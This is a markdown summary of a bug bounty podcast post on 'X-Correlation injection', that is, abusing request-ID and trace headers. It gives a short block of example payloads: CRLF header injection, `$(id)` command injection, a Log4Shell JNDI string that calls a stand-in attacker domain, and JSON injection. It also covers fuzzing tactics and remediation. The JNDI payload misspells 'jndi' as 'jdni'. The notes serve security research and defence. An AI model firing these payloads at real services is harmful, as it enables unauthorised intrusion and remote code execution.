# HackerNotes Ep.86 — The X-Correlation between Frans & RCE (Research Drop)

**Source:** Critical Thinking – Bug Bounty Podcast blog (Aug 30 2024) (<https://blog.criticalthinkingpodcast.io/p/hackernotes-ep86-xcorrelation-frans-rce-research-drop>)

## TL;DR

- "X-Correlation Injection": headers such as `X-Request-ID`, `X-Correlation-ID`, etc., are more than debugging aids; they can expand attack surface by entering multiple server-side contexts (logging, CI pipelines, internal services).
- Key steps:
  - Identify candidate headers via `Access-Control-*` or response headers containing `-id` or `id`.
  - If header value is reflected in response, treat as high-signal lead.
- Fuzzing tactics:
  - Error-based fuzzing: inject unusual characters into header to provoke errors.
  - Blind/OOB fuzzing: use payloads in header to attempt blind XSS, OOB/RCE, SQL injection, etc.
- Example payloads (escape-sensitive):

  ```text
  x-request-id: 1%0d%0ax-account:456
  x-request-id: 1%c4%8d%c4%8anew-header: f00
  x-request-id: $(id)
  x-request-id: ${jdni:rmi://x${sys:java.version}.mydomain/a}
  x-request-id: 1"}. "payload":{"account":"456","foo":"
  ```

## X-Correlation Injection

- Headers like `X-Request-ID`, `X-Correlation-ID`, `request-id`, etc., trace requests through the application ecosystem.
- These headers often propagate through file systems, CI pipelines, and internal logs.
- No standard format; watch for any header matching `*-id`, `id`, or similar patterns.
- Identifying target headers:
  - Check response headers of application for any `-id` or `id` fields.
  - If you send a header and its value is reflected back, treat as a strong lead.
  - Check `Access-Control-*` headers for exposure clues.

## Fuzzing the Headers

- Unknown context: header values may enter unknown backend services. Explore proactively.
- Two approaches:
  1. **Error-based fuzzing**: Insert a broad set of ASCII or special characters in the header to provoke errors. Look for 500s or unusual responses.
  2. **Blind/OOB fuzzing**: Use headers with payloads expecting an out-of-band trigger. Examples:
     - Header blind XSS payloads.
     - DNS/OOB callbacks.
     - Log4Shell-style `${jndi:...}` payloads.
- Beware false positives:
  - Header values may be validated by regex (e.g., `^[a-f0-9-]{36}$`). Non-matching values cause errors.
  - Some endpoints may not allow the header at all (causes error). Validate whether the header is allowed.

## Findings

- **Path traversal / arbitrary file write**
  - Example: a trace ID caused metrics to be written to `/tmp/trace-data/<id>` and could be weaponized.
- **Header injection**
  - Example: `x-request-id: 1%0d%0ax-account:456` injected a new header downstream.
  - Java-specific header injection via encoded newline sequences can create new headers.
- **OS command injection**
  - Example: `x-request-id: $(id)` executed in a shell context on some services.
- **Log4Shell**
  - Example: `${jndi:rmi://...}` payloads still trigger vulnerable internal services.
- **JSON injection**
  - Header values injected into server-side JSON blobs can alter parsed objects or properties.

## Server-side JSON Injection

- JSON injection is common and underappreciated.
- Questions to determine context:
  - Are properties allowed or restricted?
  - Is nested object syntax allowed?
  - How are quotes handled (`"` vs `\"`)?
  - Are premature endings or duplicate properties tolerated?
- Test patterns:

  ```json
  // premature ending examples (conceptual)
  id: 1"}x}} -> Error
  id: 1"}}x} -> Error
  id: 1"}}}x -> OK
  ```

- Nested injection example (conceptual):

  ```json
  {
    "req-id":"1",
    "foo":{"foo":"","id":"1234","trace":""},
    "id":"4567"
  }
  ```

- Other injection targets:
  - S3 upload policy conditions
  - JWT payloads (if JSON inside token is used without validation)

## Detection Tips

- End payloads with `"` or `\` to detect JSON/string context breaks.
- Use OOB services for blind detection (DNS, HTTP callbacks).
- Monitor application logs, temp file systems, CI artifacts, and storage buckets for injected content.

## Remediation Guidance (high level)

- Treat correlation headers as untrusted input.
- Normalize and validate header formats server-side.
- Use strict allowlists for header values and reject unexpected characters.
- Ensure logging and downstream systems sanitize or escape header values before use.
- Apply CSP and output-encoding where header values are rendered into responses.
- Keep Java components and logging frameworks patched to mitigate known RCE vectors like Log4Shell.

## Key Takeaways

- Correlation and trace headers expand the attack surface across many contexts.
- Fuzz these headers with both error-based and blind/OOB payloads.
- JSON injection vectors are common and impactful.
- End payloads with context-breaking characters to reveal parsing contexts.

## References

- HackerNotes Ep.86 blog post. <https://blog.criticalthinkingpodcast.io/p/hackernotes-ep86-xcorrelation-frans-rce-research-drop>
- Research by Frans Rosen and contributors.
